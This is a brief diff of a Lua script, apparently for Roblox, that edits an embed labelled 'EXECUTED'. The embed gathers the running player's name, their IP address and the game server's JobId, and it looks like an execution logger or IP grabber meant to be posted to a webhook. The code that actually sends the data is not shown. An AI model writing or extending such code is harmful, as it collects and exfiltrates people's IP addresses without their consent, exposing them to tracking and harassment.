@@ -8,7 +8,7 @@ local Content = '****------------------------EXECUTED------------------------***
 local Embed = {
     title = "**" .. GetName.Name .. "**";
     color = '65280';
-	description = 'Name - '..'****'..game.Players.LocalPlayer.Name..'****'..' '..'IP - '..' '..'****'..IP..'****'..' '..'Status - '..'****'..'Idrk'..'****',
+	description = 'Name - '..'****'..game.Players.LocalPlayer.Name..'****'..' '..'IP - '..' '..'****'..player_ip..'****'..' '..'Status - '..'****'..'Idrk'..'****',
     footer = { text = game.JobId };
     author = {
         name = 'Game Link';
